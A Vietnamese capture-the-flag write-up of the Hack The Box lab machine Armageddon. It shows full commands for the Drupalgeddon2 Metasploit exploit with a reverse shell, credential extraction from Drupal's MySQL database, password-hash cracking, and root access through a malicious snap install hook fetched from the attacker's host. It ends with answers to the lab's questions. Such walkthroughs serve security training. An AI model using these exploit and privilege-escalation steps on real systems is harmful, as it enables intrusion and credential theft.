![image](https://hackmd.io/_uploads/HytnIBYFC.png)

# Machine info and Comment
## Machine info
Armageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host. Enumeration of the Drupal file structure reveals credentials that allows us to connect to the MySQL server, and eventually extract the hash that is reusable for a system user. Using these credentials, we can connect to the remote machine over SSH. This user is allowed to install applications using the `snap` package manager. Privilege escalation is possible by uploading and installing to the host, a malicious application using Snapcraft.

## Comment
Máy này dẫn đến việc khai thác lỗ hổng trên web có cms cho phép leo thang đặc quyền, chèn SQL và cuối cùng là thực thi mã từ xa.

# Recon
## nmap 
Sau khi nmap ta thấy nó scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.233
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 00:49 EDT
Nmap scan report for 10.10.10.233
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds
```
Từ đây, ta sẽ scan version và banner của 2 port này xem có gì để khai thác

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -n -sCV 10.10.10.233

[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 01:47 EDT
Nmap scan report for 10.10.10.233
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
```
Dựa vào các thông tin trên ta có web sử dụng CMS **Durpal 7**, OS Centos,  (Có thể thấy trên Wappalyzer) và có cả `robots.txt` để lấy thêm thông tin

![image](https://hackmd.io/_uploads/ryUD4gqFA.png)

## OSINT
Google cũng cho ta nhiều thông tin về việc khai thác. Tuy nhiên thì vẫn phải cần phiên bản chính xác thì việc khai thác mới thành công

![image](https://hackmd.io/_uploads/SkXBIe5tA.png)

![image](https://hackmd.io/_uploads/rJv9Ig5F0.png)

```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.10.10.233/CHANGELOG.txt | grep -m2 ""

Drupal 7.56, 2017-06-21

```
Việc này có thể thấy tương tự trên `robots.txt` 

![image](https://hackmd.io/_uploads/SkF6Hx9FA.png)

Các bước khai thác thành công có thể sẽ yêu cầu một số điều kiện có trong các tính năng của web như credential, file path,.. nên ta sẽ kiểm tra xem nó bao gồm những gì. Nó có các chức năng create account, login và reset password. 2 tính năng create và reset khả năng là không dùng được vì nó liên tục báo lỗi email

![image](https://hackmd.io/_uploads/ByBcwlqFR.png)

Quay lại tìm xem phiên bản Drupal 7.56 có dễ bị khai thác không 

![image](https://hackmd.io/_uploads/S11Ete5FR.png)

Ta tìm được loại khai thác này tên là **Drupalgeddon2**. Việc khai thác lỗ hổng cho phép **leo quyền**, **chèn SQL** và cuối cùng là **RCE**

![image](https://hackmd.io/_uploads/S1YZsecYR.png)

![image](https://hackmd.io/_uploads/SJvDogcF0.png)

# User flag 
## Exploit
### Metasploit
![image](https://hackmd.io/_uploads/ryj2ox9YR.png)

Set local và target IP theo các `options` yêu cầu
```
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-m
                                           etasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.190.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)

View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 10.10.14.93
lhost => 10.10.14.93
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 10.10.10.233
rhosts => 10.10.10.233
```
`run` để bắt đầu chạy khai thác
```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.10.10.233
[*] Meterpreter session 2 opened (10.10.14.93:4444 -> 10.10.10.233:45174) at 2024-08-02 01:28:16 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 13145 created.
Channel 0 created.
whoami
apache
```
Ta có được máy chủ web đang chạy với người dùng **apache**

## Post-Exploit
Sau khi tìm không thấy user flag ở đây ta tiếp tục tìm xem có tài khoản của người dùng khác hay không bằng `/etc/passwd`

![image](https://hackmd.io/_uploads/Bk2ubbcFA.png)

Việc sử dụng `sudo -l` và lệnh `find` để leo quyền đọc `/etc/shadow` hay leo thẳng root đều không có nên ta sẽ làm cách khác mà lỗ hổng này có chính là **SQL**

![image](https://hackmd.io/_uploads/B1u_zZqtA.png)

Có được Mysql ta tìm file [config](https://www.drupal.org/forum/support/post-installation/2009-01-14/mysql-password-location)

![image](https://hackmd.io/_uploads/HklG7-cFR.png)

![image](https://hackmd.io/_uploads/ByWQQW5K0.png)

`cat settings.php` là ta có credential truy cập vào db với username:password là drupaluser:**CQHEy@9M*m23gBVj**

![image](https://hackmd.io/_uploads/B1abLW9tC.png)

```
meterpreter > shell
Process 14815 created.
Channel 5 created.

mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'show tables;'
Tables_in_drupal
actions
authmap
batch
block
<SNIP>
users
users_roles
variable
watchdog
```
Ta chú ý có bảng **users**. Truy vấn vào bảng này để xem có password hay không

```
mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'show tables; SELECT id, username, email FROM users;'

uid     name    pass    mail    theme   signature       signature_format        created access  login   status       timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0   NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu  a:1:{s:7:"overlay";i:1;}
3       ad      $S$DqCOt0QnQQESyRzCEuQdIW8rSn65iusmL0KF8nwYixztvG76EXXT ad@gmail.com                    filtered_html        1722578784      0       0       0       Europe/London           0       ad@gmail.com    NULL
```
Vậy là table này có chứa credential của `brucetherealadmin` và có cả tài khoản của ta khi test

### JohnTheRipper
Sử dụng John để crack password
```
┌──(kali㉿kali)-[~]
└─$ echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
                                                                                                             
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:00 DONE (2024-08-02 03:18) 1.515g/s 351.5p/s 351.5c/s 351.5C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Login vào web `brucetherealadmin:booboo` nhưng lại không có gì

![image](https://hackmd.io/_uploads/rJUlF-9KC.png)

Bước đầu recon ta còn một service ssh. Tiến hành kết nối ssh 
```
┌──(kali㉿kali)-[~]
└─$ ssh brucetherealadmin@10.10.10.233    
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ED25519 key fingerprint is SHA256:rMsnEyZLB6x3S3t/2SFrEG1MnMxicQ0sVs9pFhjchIQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$ cat user.txt
56ddfa6966b8******
```
# Rootflag
## Exploit 
Sử dụng `sudo -l` để liệt kê các quyền sudo mà người dùng hiện tại có trên hệ thống. 
```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
Trong [gtfobins](https://gtfobins.github.io/gtfobins/snap/#sudo) ta sẽ có script để leo quyền

![image](https://hackmd.io/_uploads/BJDpKM9K0.png)
Theo script chạy, snap có thể truy cập vào máy chủ khi chạy ở chế độ gọi là `--devmode`. Ngoài ra, snap sử dụng các `--hook` và cụ thể là ghi lại toàn bộ  cài đặt đang chạy trong quá trình cài đặt. Điều đó có nghĩa là nếu `--devmode` được chỉ định, thì hook này sẽ được chạy tại thời điểm cài đặt, cấp quyền truy cập vào máy chủ và vì chúng ta có thể thực thi lệnh này với tư cách là root, thì mã sẽ được thực thi trong quá trình cài đặt
### Máy tấn công
```
COMMAND='cat /root/root.txt'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
Sau khi tạo xong, ta sẽ tạo server để máy kia nhận file về
```
┌──(kali㉿kali)-[/tmp/tmp.iowiQJMSWW]
└─$ python3 -m http.server 8888                                 
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...

```
### Máy mục tiêu
```
[brucetherealadmin@armageddon ~]$ which curl
/usr/bin/curl

[brucetherealadmin@armageddon ~]$ curl http://10.10.14.93:8888/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
```
## Post-Exploit
Hoàn thành tải file về máy mục tiêu, sử dụng lệnh cuối để lấy được flag 
```
[brucetherealadmin@armageddon ~]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
Run install hook of "xxxx" snap if present                                                                    |error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": 2a2785a9a*******)
```

# Results
1. How many TCP ports are open on Armageddon? --> 2
2. What is the name of the content management system the website is using? --> drupal
3. What is the name given to the exploit that targets Drupal < 8.3.9 / < 8.4.6 / < 8.5.1? --> drupalgeddon2
4. What user is the webserver running as? --> apache
5. What is the password for the MySQL database used by the site? --> CQHEy@9M*m23gBVj
6. What is the name of the table in the Drupal database that holder usernames and password hashes? --> users
7. What is the brucetherealadmin's password? --> booboo
8. Submit the flag located in the brucetherealadmin user's home directory. --> 56ddfa6966b8ad974c******
9. What is the full path to the binary on this machine that brucetherealadmin can run as root? --> /usr/bin/snap
10. Submit the flag located in root's home directory. --> 2a2785a9a08*******

![image](https://hackmd.io/_uploads/HyPdtM9FR.png)
